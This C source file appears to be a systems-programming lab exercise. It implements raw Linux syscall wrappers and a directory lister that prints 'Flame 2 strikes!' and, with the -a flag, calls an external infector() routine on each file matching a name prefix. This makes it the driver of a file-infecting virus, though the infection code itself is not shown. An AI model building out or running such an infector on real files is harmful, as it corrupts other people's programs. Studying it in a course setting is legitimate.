#include "util.h"

#define ARR_LEN(a) (sizeof((a)) / sizeof(*(a)))

typedef unsigned long SYS_CALL_ARG;
typedef int (*SYSCALL)(int cid, SYS_CALL_ARG arg0, SYS_CALL_ARG arg1, SYS_CALL_ARG arg2);
int system_call(int cid, SYS_CALL_ARG arg0, SYS_CALL_ARG arg1, SYS_CALL_ARG arg2);
SYSCALL SysCall = system_call;

typedef unsigned long FILE;

void *NULL = 0;

#define stdin  0
#define stdout 1
#define stderr 2

typedef int RW;
RW const RW_READ  = 0;
RW const RW_WRITE = 1;

int const SYS_EXIT    = 1;
int const SYS_READ    = 3;
int const SYS_WRITE   = 4;
int const SYS_OPEN    = 5;
int const SYS_CLOSE   = 6;
int const SYS_LSEEK   = 19;
int const SYS_GETDENT = 141;

int const SEEK_SET = 0;
int const SEEK_CUR = 1;
int const SEEK_END = 2;

int const O_RDONLY    = 0;
int const O_WRONLY    = 1;
int const O_CREAT     = 64;
int const O_TRUNC     = 512;
int const O_DIRECTORY = 65536;

int const DT_UNKNOWN = 0;
int const DT_FIFO    = 1;
int const DT_CHR     = 2;
int const DT_DIR     = 4;
int const DT_BLK     = 6;
int const DT_REG     = 8;
int const DT_LNK     = 10;
int const DT_SOCK    = 12;
int const DT_WHT     = 14;

int DebugMode = 0;
FILE const DebugOut = stderr;

typedef struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
                        /* length is actually (d_reclen - 2 -
                        offsetof(struct linux_dirent, d_name)) */
    /*
    char           pad;
    char           d_type;
    */
} linux_dirent;
char linux_dirent_type(linux_dirent *d) {
    return *((char *)d + d->d_reclen - sizeof(char));
}
char* linux_dirent_type_s(linux_dirent *d) {
    char d_type = linux_dirent_type(d);
    return (d_type == DT_REG) ?  "regular" :
           (d_type == DT_DIR) ?  "directory" :
           (d_type == DT_FIFO) ? "FIFO" :
           (d_type == DT_SOCK) ? "socket" :
           (d_type == DT_LNK) ?  "symlink" :
           (d_type == DT_BLK) ?  "block dev" :
           (d_type == DT_CHR) ?  "char dev" :
           (d_type == DT_UNKNOWN) ? "unknown" :
           "???";
}

int dbg_write(void *buffer, int len) {
    return system_call(SYS_WRITE, DebugOut, (SYS_CALL_ARG)buffer, (SYS_CALL_ARG)len);
}

int dbg_write_c(char c) {
    return dbg_write(&c, 1);
}

int dbg_write_line() {
    return dbg_write_c('\n');
}

int dbg_write_s(char *s) {
    return dbg_write(s, strlen(s));
}

int dbg_write_num(int n) {
    return dbg_write_s(itoa(n));
}

void dbg_print_sys_call_info(int cid, SYS_CALL_ARG arg0, SYS_CALL_ARG arg1, SYS_CALL_ARG arg2, int e) {
    dbg_write_s("DEBUG SYS_CALL: ");

    dbg_write_s("ID=");
    dbg_write_num(cid);
    dbg_write_s(", arg0=");
    dbg_write_num(arg0);
    dbg_write_s(", arg1=");
    dbg_write_num(arg1);
    dbg_write_s(", arg2=");
    dbg_write_num(arg2);
    dbg_write_s(", ret=");
    dbg_write_num(e);
    dbg_write_line();
}

int dbg_system_call(int cid, SYS_CALL_ARG arg0, SYS_CALL_ARG arg1, SYS_CALL_ARG arg2) {
    int e = system_call(cid, arg0, arg1, arg2);
    dbg_print_sys_call_info(cid, arg0, arg1, arg2, e);
    return e;
}

void prg_exit(int status) {
    SysCall(SYS_EXIT, status, 0, 0);
}

int write(FILE fd, void *buffer, int len) {
    return SysCall(SYS_WRITE, fd, (SYS_CALL_ARG)buffer, (SYS_CALL_ARG)len);
}

int read(FILE fd, void *buffer, int len) {
    return SysCall(SYS_READ, fd, (SYS_CALL_ARG)buffer, (SYS_CALL_ARG)len);
}

FILE open(char *file_name, int flags, int mode) {
    return SysCall(SYS_OPEN, (SYS_CALL_ARG)file_name, (SYS_CALL_ARG)flags, (SYS_CALL_ARG)mode);
}

int close(FILE fd) {
    if (fd >= 0 && fd != stdin && fd != stdout && fd != stderr) {
        return SysCall(SYS_CLOSE, fd, 0, 0);
    }

    return -1;
}

int lseek(FILE fd, int offset, int whence) {
    return SysCall(SYS_LSEEK, fd, (SYS_CALL_ARG)offset, (SYS_CALL_ARG)whence);
}

int getdents(FILE fd, char *dirp, unsigned int count) {
    return SysCall(SYS_GETDENT, fd, (SYS_CALL_ARG)dirp, count);
}

int read_c(FILE fd, char *c) {
    return read(fd, c, 1); 
}

int write_c(FILE fd, char c) {
    return write(fd, &c, 1);
}

int write_line(FILE fd) {
    return write_c(fd, '\n');
}

int write_s(FILE fd, char *s) {
    return write(fd, s, strlen(s));
}

int write_num(FILE fd, int n) {
    return write_s(fd, itoa(n));
}

void dbg_print_c_transform(char c, char c_old) {
    dbg_write_num(c_old);
    dbg_write_c('\t');
    dbg_write_num(c);
    dbg_write_line();
}

int read_input(FILE f_in, FILE f_out) {
    int err;

    while (1) {
        char c, c_old;
        
        err = read_c(f_in, &c);
        if (err == 0) {
            /* EOF */
            break;
        }
        else if (err < 0) {
            /* error */
            return 1;
        }

        c_old = c;
        if (c == '\n') {
            write_c(f_out, c);
            continue;
        }
        else if ('a' <= c && c <= 'z') {
            c -= 'a' - 'A';
        }

        if (DebugMode) {
            /*dbg_print_c_transform(c, c_old);*/
        }
        write_c(f_out, c);
    }

    return 0;
}

FILE open_f(char *file_name, RW rw, int flags) {
    int f, mode;
    char *rws = NULL;
    
    if (rw == RW_WRITE) {
        flags = O_WRONLY | O_TRUNC | O_CREAT | flags;
        mode = 0777;
        rws = "writing";
    }
    else {
        flags = O_RDONLY;
        mode = 0;
        rws = "reading";
    }

    f = open(file_name, flags, mode);
    if (f < 0) {
        write_s(stdout, "Failed to open the file '");
        write_s(stdout, file_name);
        write_s(stdout, "' for ");
        write_s(stdout, rws);
        write_s(stdout, "\n");
    }

    return f;
}

FILE open_f_arg(char **argv, int i, RW rw) {
    return open_f(argv[i] + 2, rw, 0);
}

extern void infector(char *file_name);

int print_dirents_file(FILE dir, FILE f_out, char *prefix, int append) {
    char buf[8 * (1 << 10)];
    linux_dirent *d = NULL;
    int nread = 0, bpos = 0;
    int prefix_len = 0;
    
    if (prefix) {
        prefix_len = strlen(prefix);
    }
    while (1) {
        nread = getdents(dir, buf, ARR_LEN(buf));
        if (nread < 0) {
            write_s(f_out, "An error occurred while enumerating the directory");
            return 2;
        }
        else if (nread == 0) {
            /* End of Directory */
            break;
        }

        for (bpos = 0; bpos < nread; bpos += d->d_reclen) {
            d = (linux_dirent *)(buf + bpos);
            if (!prefix || strncmp(prefix, d->d_name, prefix_len) == 0) {
                write_s(f_out, "'");
                write_s(f_out, d->d_name);
                write_s(f_out, "'");
                write_s(f_out, ", ");
                write_s(f_out, linux_dirent_type_s(d));
                write_line(f_out);

                if (prefix && append) {
                    infector(d->d_name);
                }
            }
        }
    }

    return 0;
}

int print_dirents(char *dir, FILE f_out, char *prefix, int append) {
    FILE f_dir = -1;
    int err = 0;

    f_dir = open_f(dir, RW_READ, O_DIRECTORY);
    if (f_dir < 0) {
        write_s(f_out, "Could not open the current dir for reading");
        return 1;
    }

    err = print_dirents_file(f_dir, f_out, prefix, append);
    close(f_dir);
    return err;
}

extern void code_start(void);
extern void code_end(void);

void print_infection_code_addr(FILE f_out) {
    write_s(f_out, "code_start: ");
    write_num(f_out, (int)code_start);
    write_line(f_out);

    write_s(f_out, "code_end: ");
    write_num(f_out, (int)code_end);
    write_line(f_out);
}

int main(int argc, char **argv) {
    int i = 0, err = 0;
    int exit_code = 0;
    char *prefix = NULL;
    int append = 0;
    FILE f_out = stdout;

    for (i = 1; i < argc; ++i) {
        if (strncmp("-D", argv[i], 2) == 0) {
            DebugMode = 1;
            SysCall = dbg_system_call;
            break;
        }
    }

    for (i = 1; i < argc; ++i) {
        if (strncmp("-p", argv[i], 2) == 0) {
            prefix = argv[i] + 2;
        }
        else if (strncmp("-a", argv[i], 2) == 0) {
            prefix = argv[i] + 2;
            append = 1;
        }
    }

    write_s(f_out, "Flame 2 strikes!\n");
    print_infection_code_addr(f_out);
    
    if (!err) {
        exit_code = print_dirents(".", stdout, prefix, append);
        if (exit_code != 0) {
            exit_code = 0x55;
        }
    }
    close(DebugOut);
    return exit_code;
}